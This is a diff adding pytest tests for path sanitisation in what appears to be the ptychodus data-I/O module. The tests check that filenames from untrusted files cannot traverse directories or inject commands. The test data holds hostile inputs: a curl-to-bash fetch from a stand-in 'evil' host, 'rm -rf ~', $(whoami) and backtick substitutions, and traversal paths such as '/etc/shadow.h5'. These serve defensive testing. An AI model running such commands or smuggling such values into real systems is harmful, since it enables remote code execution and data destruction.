@@ -17,6 +17,8 @@ from ptychodus.api.io import (
     StandardFileLayout,
     load_diffraction_data,
     load_product,
+    resolve_external_link_path,
+    sanitize_path_component,
     save_diffraction_data,
     save_product,
 )
@@ -491,3 +493,55 @@ class TestProductRoundTrip:
 
         assert loaded.metadata.polarization is None
         assert 'Unknown polarization' in caplog.text
+
+
+class TestSanitizePathComponent:
+    """Product names are read verbatim from user-supplied files."""
+
+    @pytest.mark.parametrize(
+        'name',
+        [
+            '../../../etc/ptychodus',
+            '/etc/ptychodus',
+            'run1; curl http://evil/x.sh | bash',
+            'run1$(whoami)',
+            'run1`id`',
+            'run1\nrm -rf ~',
+            '..',
+            '.',
+        ],
+    )
+    def test_hostile_names_yield_one_safe_component(self, name: str) -> None:
+        result = sanitize_path_component(name)
+
+        assert '/' not in result
+        assert '\\' not in result
+        assert not result.startswith('.')
+        assert (Path('/base') / result).parent == Path('/base')
+
+    def test_ordinary_name_is_preserved(self) -> None:
+        assert sanitize_path_component('scan_042-run.1') == 'scan_042-run.1'
+
+    def test_empty_result_falls_back(self) -> None:
+        assert sanitize_path_component('...') == 'unnamed'
+        assert sanitize_path_component('', fallback='product') == 'product'
+
+    def test_result_is_length_bounded(self) -> None:
+        assert len(sanitize_path_component('a' * 500)) == 128
+
+
+class TestResolveExternalLinkPath:
+    """External-link targets are chosen by whoever wrote the master file."""
+
+    def test_relative_target_resolves_under_base(self) -> None:
+        assert resolve_external_link_path(Path('/data/scan'), 'eiger.h5') == Path(
+            '/data/scan/eiger.h5'
+        )
+        assert resolve_external_link_path(Path('/data/scan'), 'sub/eiger.h5') == Path(
+            '/data/scan/sub/eiger.h5'
+        )
+
+    @pytest.mark.parametrize('filename', ['/etc/shadow.h5', '../../secrets.h5', 'a/../../b.h5'])
+    def test_escaping_target_is_rejected(self, filename: str) -> None:
+        with pytest.raises(ValueError):
+            resolve_external_link_path(Path('/data/scan'), filename)
